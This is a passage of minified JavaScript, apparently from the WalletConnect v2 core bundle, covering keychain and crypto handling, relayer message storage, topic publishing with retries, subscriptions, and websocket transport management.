i=this.keychain.get(r);if(typeof i>"u"){const{message:s}=Xe("NO_MATCHING_KEY",`${this.name}: ${r}`);throw new Error(s)}return i}),El(this,"del",async r=>{this.isInitialized(),this.keychain.delete(r),await this.persist()}),this.core=e,this.logger=aa(n,this.name)}get context(){return oa(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}async setKeyChain(e){await this.core.storage.setItem(this.storageKey,s7(e))}async getKeyChain(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?o7(e):void 0}async persist(){await this.setKeyChain(this.keychain)}isInitialized(){if(!this.initialized){const{message:e}=Xe("NOT_INITIALIZED",this.name);throw new Error(e)}}}var r8e=Object.defineProperty,i8e=(t,e,n)=>e in t?r8e(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Gi=(t,e,n)=>i8e(t,typeof e!="symbol"?e+"":e,n);class s8e{constructor(e,n,r){this.core=e,this.logger=n,Gi(this,"name",XTe),Gi(this,"keychain"),Gi(this,"randomSessionIdentifier",y7()),Gi(this,"initialized",!1),Gi(this,"clientId"),Gi(this,"init",async()=>{this.initialized||(await this.keychain.init(),this.initialized=!0)}),Gi(this,"hasKeys",i=>(this.isInitialized(),this.keychain.has(i))),Gi(this,"getClientId",async()=>{if(this.isInitialized(),this.clientId)return this.clientId;const i=await this.getClientSeed(),s=az(i),o=Rie(s.publicKey);return this.clientId=o,o}),Gi(this,"generateKeyPair",()=>{this.isInitialized();const i=u4e();return this.setPrivateKey(i.publicKey,i.privateKey)}),Gi(this,"signJWT",async i=>{this.isInitialized();const s=await this.getClientSeed(),o=az(s),a=this.randomSessionIdentifier;return await KEe(a,i,exe,o)}),Gi(this,"generateSharedKey",(i,s,o)=>{this.isInitialized();const a=this.getPrivateKey(i),c=l4e(a,s);return this.setSymKey(c,o)}),Gi(this,"setSymKey",async(i,s)=>{this.isInitialized();const o=s||WT(i);return await this.keychain.set(o,i),o}),Gi(this,"deleteKeyPair",async i=>{this.isInitialized(),await this.keychain.del(i)}),Gi(this,"deleteSymKey",async i=>{this.isInitialized(),await this.keychain.del(i)}),Gi(this,"encode",async(i,s,o)=>{this.isInitialized();const a=Ioe(o),c=Rf(s);if(_q(a))return h4e(c,o?.encoding);if(Eq(a)){const m=a.senderPublicKey,b=a.receiverPublicKey;i=await this.generateSharedKey(m,b)}const l=this.getSymKey(i),{type:f,senderPublicKey:h}=a;return d4e({type:f,symKey:l,message:c,senderPublicKey:h,encoding:o?.encoding})}),Gi(this,"decode",async(i,s,o)=>{this.isInitialized();const a=m4e(s,o);if(_q(a)){const c=p4e(s,o?.encoding);return sg(c)}if(Eq(a)){const c=a.receiverPublicKey,l=a.senderPublicKey;i=await this.generateSharedKey(c,l)}try{const c=this.getSymKey(i),l=f4e({symKey:c,encoded:s,encoding:o?.encoding});return sg(l)}catch(c){this.logger.error(`Failed to decode message from topic: '${i}', clientId: '${await this.getClientId()}'`),this.logger.error(c)}}),Gi(this,"getPayloadType",(i,s=Yo)=>{const o=l_({encoded:i,encoding:s});return cg(o.type)}),Gi(this,"getPayloadSenderPublicKey",(i,s=Yo)=>{const o=l_({encoded:i,encoding:s});return o.senderPublicKey?ta(o.senderPublicKey,vo):void 0}),this.core=e,this.logger=aa(n,this.name),this.keychain=r||new n8e(this.core,this.logger)}get context(){return oa(this.logger)}async setPrivateKey(e,n){return await this.keychain.set(e,n),e}getPrivateKey(e){return this.keychain.get(e)}async getClientSeed(){let e="";try{e=this.keychain.get(qq)}catch{e=y7(),await this.keychain.set(qq,e)}return XIe(e,"base16")}getSymKey(e){return this.keychain.get(e)}isInitialized(){if(!this.initialized){const{message:e}=Xe("NOT_INITIALIZED",this.name);throw new Error(e)}}}var o8e=Object.defineProperty,a8e=Object.defineProperties,c8e=Object.getOwnPropertyDescriptors,Jq=Object.getOwnPropertySymbols,u8e=Object.prototype.hasOwnProperty,l8e=Object.prototype.propertyIsEnumerable,A7=(t,e,n)=>e in t?o8e(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,d8e=(t,e)=>{for(var n in e||(e={}))u8e.call(e,n)&&A7(t,n,e[n]);if(Jq)for(var n of Jq(e))l8e.call(e,n)&&A7(t,n,e[n]);return t},f8e=(t,e)=>a8e(t,c8e(e)),Oa=(t,e,n)=>A7(t,typeof e!="symbol"?e+"":e,n);class h8e extends Wwe{constructor(e,n){super(e,n),this.logger=e,this.core=n,Oa(this,"messages",new Map),Oa(this,"messagesWithoutClientAck",new Map),Oa(this,"name",rxe),Oa(this,"version",ixe),Oa(this,"initialized",!1),Oa(this,"storagePrefix",Yl),Oa(this,"init",async()=>{if(!this.initialized){this.logger.trace("Initialized");try{const r=await this.getRelayerMessages();typeof r<"u"&&(this.messages=r);const i=await this.getRelayerMessagesWithoutClientAck();typeof i<"u"&&(this.messagesWithoutClientAck=i),this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",size:this.messages.size})}catch(r){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(r)}finally{this.initialized=!0}}}),Oa(this,"set",async(r,i,s)=>{this.isInitialized();const o=Pc(i);let a=this.messages.get(r);if(typeof a>"u"&&(a={}),typeof a[o]<"u")return o;if(a[o]=i,this.messages.set(r,a),s===GT.inbound){const c=this.messagesWithoutClientAck.get(r)||{};this.messagesWithoutClientAck.set(r,f8e(d8e({},c),{[o]:i}))}return await this.persist(),o}),Oa(this,"get",r=>{this.isInitialized();let i=this.messages.get(r);return typeof i>"u"&&(i={}),i}),Oa(this,"getWithoutAck",r=>{this.isInitialized();const i={};for(const s of r){const o=this.messagesWithoutClientAck.get(s)||{};i[s]=Object.values(o)}return i}),Oa(this,"has",(r,i)=>{this.isInitialized();const s=this.get(r),o=Pc(i);return typeof s[o]<"u"}),Oa(this,"ack",async(r,i)=>{this.isInitialized();const s=this.messagesWithoutClientAck.get(r);if(typeof s>"u")return;const o=Pc(i);delete s[o],Object.keys(s).length===0?this.messagesWithoutClientAck.delete(r):this.messagesWithoutClientAck.set(r,s),await this.persist()}),Oa(this,"del",async r=>{this.isInitialized(),this.messages.delete(r),this.messagesWithoutClientAck.delete(r),await this.persist()}),this.logger=aa(e,this.name),this.core=n}get context(){return oa(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get storageKeyWithoutClientAck(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name+"_withoutClientAck"}async setRelayerMessages(e){await this.core.storage.setItem(this.storageKey,s7(e))}async setRelayerMessagesWithoutClientAck(e){await this.core.storage.setItem(this.storageKeyWithoutClientAck,s7(e))}async getRelayerMessages(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?o7(e):void 0}async getRelayerMessagesWithoutClientAck(){const e=await this.core.storage.getItem(this.storageKeyWithoutClientAck);return typeof e<"u"?o7(e):void 0}async persist(){await this.setRelayerMessages(this.messages),await this.setRelayerMessagesWithoutClientAck(this.messagesWithoutClientAck)}isInitialized(){if(!this.initialized){const{message:e}=Xe("NOT_INITIALIZED",this.name);throw new Error(e)}}}var p8e=Object.defineProperty,m8e=Object.defineProperties,g8e=Object.getOwnPropertyDescriptors,Xq=Object.getOwnPropertySymbols,y8e=Object.prototype.hasOwnProperty,b8e=Object.prototype.propertyIsEnumerable,C7=(t,e,n)=>e in t?p8e(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,ob=(t,e)=>{for(var n in e||(e={}))y8e.call(e,n)&&C7(t,n,e[n]);if(Xq)for(var n of Xq(e))b8e.call(e,n)&&C7(t,n,e[n]);return t},eV=(t,e)=>m8e(t,g8e(e)),_c=(t,e,n)=>C7(t,typeof e!="symbol"?e+"":e,n);class w8e extends Gwe{constructor(e,n){super(e,n),this.relayer=e,this.logger=n,_c(this,"events",new Wc.EventEmitter),_c(this,"name",oxe),_c(this,"queue",new Map),_c(this,"publishTimeout",Ye.toMiliseconds(Ye.ONE_MINUTE)),_c(this,"initialPublishTimeout",Ye.toMiliseconds(Ye.ONE_SECOND*15)),_c(this,"needsTransportRestart",!1),_c(this,"publish",async(r,i,s)=>{var o,a,c,l,f;this.logger.debug("Publishing Payload"),this.logger.trace({type:"method",method:"publish",params:{topic:r,message:i,opts:s}});const h=s?.ttl||sxe,m=s?.prompt||!1,b=s?.tag||0,w=s?.id||mp().toString(),y=zb(jx().protocol),E={id:w,method:s?.publishMethod||y.publish,params:ob({topic:r,message:i,ttl:h,prompt:m,tag:b,attestation:s?.attestation},s?.tvf)},A=`Failed to publish payload, please try again. id:${w} tag:${b}`;try{es((o=E.params)==null?void 0:o.prompt)&&((a=E.params)==null||delete a.prompt),es((c=E.params)==null?void 0:c.tag)&&((l=E.params)==null||delete l.tag);const R=new Promise(async S=>{const v=({id:O})=>{var _;((_=E.id)==null?void 0:_.toString())===O.toString()&&(this.removeRequestFromQueue(O),this.relayer.events.removeListener(Ri.publish,v),S())};this.relayer.events.on(Ri.publish,v);const k=jl(new Promise((O,_)=>{this.rpcPublish(E,s).then(O).catch(I=>{this.logger.warn(I,I?.message),_(I)})}),this.initialPublishTimeout,`Failed initial publish, retrying.... id:${w} tag:${b}`);try{await k,this.events.removeListener(Ri.publish,v)}catch(O){this.queue.set(w,{request:E,opts:s,attempt:1}),this.logger.warn(O,O?.message)}});this.logger.trace({type:"method",method:"publish",params:{id:w,topic:r,message:i,opts:s}}),await jl(R,this.publishTimeout,A)}catch(R){if(this.logger.debug("Failed to Publish Payload"),this.logger.error(R),(f=s?.internal)!=null&&f.throwOnFailedPublish)throw R}finally{this.queue.delete(w)}}),_c(this,"publishCustom",async r=>{var i,s,o,a,c;this.logger.debug("Publishing custom payload"),this.logger.trace({type:"method",method:"publishCustom",params:r});const{payload:l,opts:f={}}=r,{attestation:h,tvf:m,publishMethod:b,prompt:w,tag:y,ttl:E=Ye.FIVE_MINUTES}=f,A=f.id||mp().toString(),R=zb(jx().protocol),S=b||R.publish,v={id:A,method:S,params:ob(eV(ob({},l),{ttl:E,prompt:w,tag:y,attestation:h}),m)},k=`Failed to publish custom payload, please try again. id:${A} tag:${y}`;try{es((i=v.params)==null?void 0:i.prompt)&&((s=v.params)==null||delete s.prompt),es((o=v.params)==null?void 0:o.tag)&&((a=v.params)==null||delete a.tag);const O=new Promise(async _=>{const I=({id:B})=>{var U;((U=v.id)==null?void 0:U.toString())===B.toString()&&(this.removeRequestFromQueue(B),this.relayer.events.removeListener(Ri.publish,I),_())};this.relayer.events.on(Ri.publish,I);const T=jl(new Promise((B,U)=>{this.rpcPublish(v,f).then(B).catch(M=>{this.logger.warn(M,M?.message),U(M)})}),this.initialPublishTimeout,`Failed initial custom payload publish, retrying.... method:${S} id:${A} tag:${y}`);try{await T,this.events.removeListener(Ri.publish,I)}catch(B){this.queue.set(A,{request:v,opts:f,attempt:1}),this.logger.warn(B,B?.message)}});this.logger.trace({type:"method",method:"publish",params:{id:A,payload:l,opts:f}}),await jl(O,this.publishTimeout,k)}catch(O){if(this.logger.debug("Failed to Publish Payload"),this.logger.error(O),(c=f?.internal)!=null&&c.throwOnFailedPublish)throw O}finally{this.queue.delete(A)}}),_c(this,"on",(r,i)=>{this.events.on(r,i)}),_c(this,"once",(r,i)=>{this.events.once(r,i)}),_c(this,"off",(r,i)=>{this.events.off(r,i)}),_c(this,"removeListener",(r,i)=>{this.events.removeListener(r,i)}),this.relayer=e,this.logger=aa(n,this.name),this.registerEventListeners()}get context(){return oa(this.logger)}async rpcPublish(e,n){this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"message",direction:"outgoing",request:e});const r=await this.relayer.request(e);return this.relayer.events.emit(Ri.publish,ob(ob({},e),n)),this.logger.debug("Successfully Published Payload"),r}removeRequestFromQueue(e){this.queue.delete(e)}checkQueue(){this.queue.forEach(async(e,n)=>{var r;const i=e.attempt+1;this.queue.set(n,eV(ob({},e),{attempt:i})),this.logger.warn({},`Publisher: queue->publishing: ${e.request.id}, tag: ${(r=e.request.params)==null?void 0:r.tag}, attempt: ${i}`),await this.rpcPublish(e.request,e.opts),this.logger.warn({},`Publisher: queue->published: ${e.request.id}`)})}registerEventListeners(){this.relayer.core.heartbeat.on(Fg.pulse,()=>{if(this.needsTransportRestart){this.needsTransportRestart=!1,this.relayer.events.emit(Ri.connection_stalled);return}this.checkQueue()}),this.relayer.on(Ri.message_ack,e=>{this.removeRequestFromQueue(e.id.toString())})}}var v8e=Object.defineProperty,E8e=(t,e,n)=>e in t?v8e(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,ab=(t,e,n)=>E8e(t,typeof e!="symbol"?e+"":e,n);class _8e{constructor(){ab(this,"map",new Map),ab(this,"set",(e,n)=>{const r=this.get(e);this.exists(e,n)||this.map.set(e,[...r,n])}),ab(this,"get",e=>this.map.get(e)||[]),ab(this,"exists",(e,n)=>this.get(e).includes(n)),ab(this,"delete",(e,n)=>{if(typeof n>"u"){this.map.delete(e);return}if(!this.map.has(e))return;const r=this.get(e);if(!this.exists(e,n))return;const i=r.filter(s=>s!==n);if(!i.length){this.map.delete(e);return}this.map.set(e,i)}),ab(this,"clear",()=>{this.map.clear()})}get topics(){return Array.from(this.map.keys())}}var A8e=Object.defineProperty,C8e=Object.defineProperties,S8e=Object.getOwnPropertyDescriptors,tV=Object.getOwnPropertySymbols,T8e=Object.prototype.hasOwnProperty,x8e=Object.prototype.propertyIsEnumerable,S7=(t,e,n)=>e in t?A8e(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Nv=(t,e)=>{for(var n in e||(e={}))T8e.call(e,n)&&S7(t,n,e[n]);if(tV)for(var n of tV(e))x8e.call(e,n)&&S7(t,n,e[n]);return t},P9=(t,e)=>C8e(t,S8e(e)),dr=(t,e,n)=>S7(t,typeof e!="symbol"?e+"":e,n);class I8e extends Ywe{constructor(e,n){super(e,n),this.relayer=e,this.logger=n,dr(this,"subscriptions",new Map),dr(this,"topicMap",new _8e),dr(this,"events",new Wc.EventEmitter),dr(this,"name",hxe),dr(this,"version",pxe),dr(this,"pending",new Map),dr(this,"cached",[]),dr(this,"initialized",!1),dr(this,"storagePrefix",Yl),dr(this,"subscribeTimeout",Ye.toMiliseconds(Ye.ONE_MINUTE)),dr(this,"initialSubscribeTimeout",Ye.toMiliseconds(Ye.ONE_SECOND*15)),dr(this,"clientId"),dr(this,"batchSubscribeTopicsLimit",500),dr(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),this.registerEventListeners(),await this.restore()),this.initialized=!0}),dr(this,"subscribe",async(r,i)=>{var s;this.isInitialized(),this.logger.debug("Subscribing Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:r,opts:i}});try{const o=jx(i),a={topic:r,relay:o,transportType:i?.transportType};(s=i?.internal)!=null&&s.skipSubscribe||this.pending.set(r,a);const c=await this.rpcSubscribe(r,o,i);return typeof c=="string"&&(this.onSubscribe(c,a),this.logger.debug("Successfully Subscribed Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:r,opts:i}})),c}catch(o){throw this.logger.debug("Failed to Subscribe Topic"),this.logger.error(o),o}}),dr(this,"unsubscribe",async(r,i)=>{this.isInitialized(),typeof i?.id<"u"?await this.unsubscribeById(r,i.id,i):await this.unsubscribeByTopic(r,i)}),dr(this,"isSubscribed",r=>new Promise(i=>{i(this.topicMap.topics.includes(r))})),dr(this,"isKnownTopic",r=>new Promise(i=>{i(this.topicMap.topics.includes(r)||this.pending.has(r)||this.cached.some(s=>s.topic===r))})),dr(this,"on",(r,i)=>{this.events.on(r,i)}),dr(this,"once",(r,i)=>{this.events.once(r,i)}),dr(this,"off",(r,i)=>{this.events.off(r,i)}),dr(this,"removeListener",(r,i)=>{this.events.removeListener(r,i)}),dr(this,"start",async()=>{await this.onConnect()}),dr(this,"stop",async()=>{await this.onDisconnect()}),dr(this,"restart",async()=>{await this.restore(),await this.onRestart()}),dr(this,"checkPending",async()=>{if(this.pending.size===0&&(!this.initialized||!this.relayer.connected))return;const r=[];this.pending.forEach(i=>{r.push(i)}),await this.batchSubscribe(r)}),dr(this,"registerEventListeners",()=>{this.relayer.core.heartbeat.on(Fg.pulse,async()=>{await this.checkPending()}),this.events.on(Fa.created,async r=>{const i=Fa.created;this.logger.info(`Emitting ${i}`),this.logger.debug({type:"event",event:i,data:r}),await this.persist()}),this.events.on(Fa.deleted,async r=>{const i=Fa.deleted;this.logger.info(`Emitting ${i}`),this.logger.debug({type:"event",event:i,data:r}),await this.persist()})}),this.relayer=e,this.logger=aa(n,this.name),this.clientId=""}get context(){return oa(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.relayer.core.customStoragePrefix+"//"+this.name}get length(){return this.subscriptions.size}get ids(){return Array.from(this.subscriptions.keys())}get values(){return Array.from(this.subscriptions.values())}get topics(){return this.topicMap.topics}get hasAnyTopics(){return this.topicMap.topics.length>0||this.pending.size>0||this.cached.length>0||this.subscriptions.size>0}hasSubscription(e,n){let r=!1;try{r=this.getSubscription(e).topic===n}catch{}return r}reset(){this.cached=[],this.initialized=!0}onDisable(){this.values.length>0&&(this.cached=this.values),this.subscriptions.clear(),this.topicMap.clear()}async unsubscribeByTopic(e,n){const r=this.topicMap.get(e);await Promise.all(r.map(async i=>await this.unsubscribeById(e,i,n)))}async unsubscribeById(e,n,r){this.logger.debug("Unsubscribing Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:n,opts:r}});try{const i=jx(r);await this.restartToComplete({topic:e,id:n,relay:i}),await this.rpcUnsubscribe(e,n,i);const s=Ur("USER_DISCONNECTED",`${this.name}, ${e}`);await this.onUnsubscribe(e,n,s),this.logger.debug("Successfully Unsubscribed Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:n,opts:r}})}catch(i){throw this.logger.debug("Failed to Unsubscribe Topic"),this.logger.error(i),i}}async rpcSubscribe(e,n,r){var i,s;const o=await this.getSubscriptionId(e);if((i=r?.internal)!=null&&i.skipSubscribe)return o;(!r||r?.transportType===Or.relay)&&await this.restartToComplete({topic:e,id:e,relay:n});const a={method:zb(n.protocol).subscribe,params:{topic:e}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:a});const c=(s=r?.internal)==null?void 0:s.throwOnFailedPublish;try{if(r?.transportType===Or.link_mode)return setTimeout(()=>{(this.relayer.connected||this.relayer.connecting)&&this.relayer.request(a).catch(h=>this.logger.warn(h))},Ye.toMiliseconds(Ye.ONE_SECOND)),o;const l=new Promise(async h=>{const m=b=>{b.topic===e&&(this.events.removeListener(Fa.created,m),h(b.id))};this.events.on(Fa.created,m);try{const b=await jl(new Promise((w,y)=>{this.relayer.request(a).catch(E=>{this.logger.warn(E,E?.message),y(E)}).then(w)}),this.initialSubscribeTimeout,`Subscribing to ${e} failed, please try again`);this.events.removeListener(Fa.created,m),h(b)}catch{}}),f=await jl(l,this.subscribeTimeout,`Subscribing to ${e} failed, please try again`);if(!f&&c)throw new Error(`Subscribing to ${e} failed, please try again`);return f?o:null}catch(l){if(this.logger.debug("Outgoing Relay Subscribe Payload stalled"),this.relayer.events.emit(Ri.connection_stalled),c)throw l}return null}async rpcBatchSubscribe(e){if(!e.length)return;const n=e[0].relay,r={method:zb(n.protocol).batchSubscribe,params:{topics:e.map(i=>i.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:r});try{await await jl(new Promise(i=>{this.relayer.request(r).catch(s=>this.logger.warn(s)).then(i)}),this.subscribeTimeout,"rpcBatchSubscribe failed, please try again")}catch{this.relayer.events.emit(Ri.connection_stalled)}}async rpcBatchFetchMessages(e){if(!e.length)return;const n=e[0].relay,r={method:zb(n.protocol).batchFetchMessages,params:{topics:e.map(s=>s.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:r});let i;try{i=await await jl(new Promise((s,o)=>{this.relayer.request(r).catch(a=>{this.logger.warn(a),o(a)}).then(s)}),this.subscribeTimeout,"rpcBatchFetchMessages failed, please try again")}catch{this.relayer.events.emit(Ri.connection_stalled)}return i}rpcUnsubscribe(e,n,r){const i={method:zb(r.protocol).unsubscribe,params:{topic:e,id:n}};return this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:i}),this.relayer.request(i)}onSubscribe(e,n){this.setSubscription(e,P9(Nv({},n),{id:e})),this.pending.delete(n.topic)}onBatchSubscribe(e){e.length&&e.forEach(n=>{this.setSubscription(n.id,Nv({},n)),this.pending.delete(n.topic)})}async onUnsubscribe(e,n,r){this.events.removeAllListeners(n),this.hasSubscription(n,e)&&this.deleteSubscription(n,r),await this.relayer.messages.del(e)}async setRelayerSubscriptions(e){await this.relayer.core.storage.setItem(this.storageKey,e)}async getRelayerSubscriptions(){return await this.relayer.core.storage.getItem(this.storageKey)}setSubscription(e,n){this.logger.debug("Setting subscription"),this.logger.trace({type:"method",method:"setSubscription",id:e,subscription:n}),this.addSubscription(e,n)}addSubscription(e,n){this.subscriptions.set(e,Nv({},n)),this.topicMap.set(n.topic,e),this.events.emit(Fa.created,n)}getSubscription(e){this.logger.debug("Getting subscription"),this.logger.trace({type:"method",method:"getSubscription",id:e});const n=this.subscriptions.get(e);if(!n){const{message:r}=Xe("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(r)}return n}deleteSubscription(e,n){this.logger.debug("Deleting subscription"),this.logger.trace({type:"method",method:"deleteSubscription",id:e,reason:n});const r=this.getSubscription(e);this.subscriptions.delete(e),this.topicMap.delete(r.topic,e),this.events.emit(Fa.deleted,P9(Nv({},r),{reason:n}))}async persist(){await this.setRelayerSubscriptions(this.values),this.events.emit(Fa.sync)}async onRestart(){if(this.cached.length){const e=[...this.cached],n=Math.ceil(this.cached.length/this.batchSubscribeTopicsLimit);for(let r=0;r<n;r++){const i=e.splice(0,this.batchSubscribeTopicsLimit);await this.batchSubscribe(i)}}this.events.emit(Fa.resubscribed)}async restore(){try{const e=await this.getRelayerSubscriptions();if(typeof e>"u"||!e.length)return;if(this.subscriptions.size&&!e.every(n=>{var r;return n.topic===((r=this.subscriptions.get(n.id))==null?void 0:r.topic)})){const{message:n}=Xe("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(n),this.logger.error(`${this.name}: ${JSON.stringify(this.values)}`),new Error(n)}this.cached=e,this.logger.debug(`Successfully Restored subscriptions for ${this.name}`),this.logger.trace({type:"method",method:"restore",subscriptions:this.values})}catch(e){this.logger.debug(`Failed to Restore subscriptions for ${this.name}`),this.logger.error(e)}}async batchSubscribe(e){e.length&&(await this.rpcBatchSubscribe(e),this.onBatchSubscribe(await Promise.all(e.map(async n=>P9(Nv({},n),{id:await this.getSubscriptionId(n.topic)})))))}async batchFetchMessages(e){if(!e.length)return;this.logger.trace(`Fetching batch messages for ${e.length} subscriptions`);const n=await this.rpcBatchFetchMessages(e);n&&n.messages&&(await R6e(Ye.toMiliseconds(Ye.ONE_SECOND)),await this.relayer.handleBatchMessageEvents(n.messages))}async onConnect(){await this.restart(),this.reset()}onDisconnect(){this.onDisable()}isInitialized(){if(!this.initialized){const{message:e}=Xe("NOT_INITIALIZED",this.name);throw new Error(e)}}async restartToComplete(e){!this.relayer.connected&&!this.relayer.connecting&&(this.cached.push(e),await this.relayer.transportOpen())}async getClientId(){return this.clientId||(this.clientId=await this.relayer.core.crypto.getClientId()),this.clientId}async getSubscriptionId(e){return Pc(e+await this.getClientId())}}var R8e=Object.defineProperty,nV=Object.getOwnPropertySymbols,P8e=Object.prototype.hasOwnProperty,N8e=Object.prototype.propertyIsEnumerable,T7=(t,e,n)=>e in t?R8e(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,rV=(t,e)=>{for(var n in e||(e={}))P8e.call(e,n)&&T7(t,n,e[n]);if(nV)for(var n of nV(e))N8e.call(e,n)&&T7(t,n,e[n]);return t},jn=(t,e,n)=>T7(t,typeof e!="symbol"?e+"":e,n);class O8e extends Kwe{constructor(e){var n;super(e),jn(this,"protocol","wc"),jn(this,"version",2),jn(this,"core"),jn(this,"logger"),jn(this,"events",new Wc.EventEmitter),jn(this,"provider"),jn(this,"messages"),jn(this,"subscriber"),jn(this,"publisher"),jn(this,"name",cxe),jn(this,"transportExplicitlyClosed",!1),jn(this,"initialized",!1),jn(this,"connectionAttemptInProgress",!1),jn(this,"relayUrl"),jn(this,"projectId"),jn(this,"packageName"),jn(this,"bundleId"),jn(this,"hasExperiencedNetworkDisruption",!1),jn(this,"pingTimeout"),jn(this,"heartBeatTimeout",Ye.toMiliseconds(Ye.THIRTY_SECONDS+Ye.FIVE_SECONDS)),jn(this,"reconnectTimeout"),jn(this,"connectPromise"),jn(this,"reconnectInProgress",!1),jn(this,"requestsInFlight",[]),jn(this,"connectTimeout",Ye.toMiliseconds(Ye.ONE_SECOND*15)),jn(this,"request",async r=>{var i,s;this.logger.debug("Publishing Request Payload");const o=r.id||mp().toString();await this.toEstablishConnection();try{this.logger.trace({id:o,method:r.method,topic:(i=r.params)==null?void 0:i.topic},"relayer.request - publishing...");const a=`${o}:${((s=r.params)==null?void 0:s.tag)||""}`;this.requestsInFlight.push(a);const c=await this.provider.request(r);return this.requestsInFlight=this.requestsInFlight.filter(l=>l!==a),c}catch(a){throw this.logger.debug(`Failed to Publish Request: ${o}`),a}}),jn(this,"resetPingTimeout",()=>{Px()&&(clearTimeout(this.pingTimeout),this.pingTimeout=setTimeout(()=>{var r,i,s,o;try{this.logger.debug({},"pingTimeout: Connection stalled, terminating..."),(o=(s=(i=(r=this.provider)==null?void 0:r.connection)==null?void 0:i.socket)==null?void 0:s.terminate)==null||o.call(s)}catch(a){this.logger.warn(a,a?.message)}},this.heartBeatTimeout))}),jn(this,"onPayloadHandler",r=>{this.onProviderPayload(r),this.resetPingTimeout()}),jn(this,"onConnectHandler",()=>{this.logger.warn({},"Relayer connected "),this.startPingTimeout(),this.events.emit(Ri.connect)}),jn(this,"onDisconnectHandler",()=>{this.logger.warn({},"Relayer disconnected "),this.requestsInFlight=[],this.onProviderDisconnect()}),jn(this,"onProviderErrorHandler",r=>{this.logger.fatal(`Fatal socket error: ${r.message}`),this.events.emit(Ri.error,r),this.logger.fatal("Fatal socket error received, closing transport"),this.transportClose()}),jn(this,"registerProviderListeners",()=>{this.provider.on(Ec.payload,this.onPayloadHandler),this.provider.on(Ec.connect,this.onConnectHandler),this.provider.on(Ec.disconnect,this.onDisconnectHandler),this.provider.on(Ec.error,this.onProviderErrorHandler)}),this.core=e.core,this.logger=BB({logger:(n=e.logger)!=null?n:axe,name:this.name}),this.messages=new h8e(this.logger,e.core),this.subscriber=new I8e(this,this.logger),this.publisher=new w8e(this,this.logger),this.projectId=e?.projectId,this.relayUrl=e?.relayUrl||Foe,h6e()?this.packageName=zz():p6e()&&(this.bundleId=zz()),this.provider={}}async init(){this.logger.trace("Initialized"),this.registerEventListeners(),await Promise.all([this.messages.init(),this.subscriber.init()]),this.initialized=!0,this.transportOpen().catch(e=>this.logger.warn(e,e?.message))}get context(){return oa(this.logger)}get connected(){var e,n,r;return((r=(n=(e=this.provider)==null?void 0:e.connection)==null?void 0:n.socket)==null?void 0:r.readyState)===1||!1}get connecting(){var e,n,r;return((r=(n=(e=this.provider)==null?void 0:e.connection)==null?void 0:n.socket)==null?void 0:r.readyState)===0||this.connectPromise!==void 0||!1}async publish(e,n,r){this.isInitialized(),await this.publisher.publish(e,n,r),await this.recordMessageEvent({topic:e,message:n,publishedAt:Date.now(),transportType:Or.relay},GT.outbound)}async publishCustom(e){this.isInitialized(),await this.publisher.publishCustom(e)}async subscribe(e,n){var r,i,s;this.isInitialized(),(!(n!=null&&n.transportType)||n?.transportType==="relay")&&await this.toEstablishConnection();const o=typeof((r=n?.internal)==null?void 0:r.throwOnFailedPublish)>"u"?!0:(i=n?.internal)==null?void 0:i.throwOnFailedPublish;let a=((s=this.subscriber.topicMap.get(e))==null?void 0:s[0])||"",c;const l=f=>{f.topic===e&&(this.subscriber.off(Fa.created,l),c())};return await Promise.all([new Promise(f=>{c=f,this.subscriber.on(Fa.created,l)}),new Promise(async(f,h)=>{a=await this.subscriber.subscribe(e,rV({internal:{throwOnFailedPublish:o}},n)).catch(m=>{o&&h(m)})||a,f()})]),a}async unsubscribe(e,n){this.isInitialized(),await this.subscriber.unsubscribe(e,n)}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}off(e,n){this.events.off(e,n)}removeListener(e,n){this.events.removeListener(e,n)}async transportDisconnect(){this.provider.disconnect&&(this.hasExperiencedNetworkDisruption||this.connected)?await jl(this.provider.disconnect(),2e3,"provider.disconnect()").catch(()=>this.onProviderDisconnect()):this.onProviderDisconnect()}async transportClose(){this.transportExplicitlyClosed=!0,await this.transportDisconnect()}async transportOpen(e){if(!this.subscriber.hasAnyTopics){this.logger.info("Starting WS connection skipped because the client has no topics to work with.");return}if(this.connectPromise?(this.logger.debug({},"Waiting for existing connection attempt to resolve..."),await this.connectPromise,this.logger.debug({},"Existing connection attempt resolved")):(this.connectPromise=new Promise(async(n,r)=>{await this.connect(e).then(n).catch(r).finally(()=>{this.connectPromise=void 0})}),await this.connectPromise),!this.connected)throw new Error(`Couldn't establish socket connection to the relay server: ${this.relayUrl}`)}async restartTransport(e){this.logger.debug({},"Restarting transport..."),!this.connectionAttemptInProgress&&(this.relayUrl=e||this.relayUrl,await this.confirmOnlineStateOrThrow(),await this.transportClose(),await this.transportOpen())}async confirmOnlineStateOrThrow(){if(!await Bq())throw new Error("No internet connection detected. Please restart your network and try again.")}async 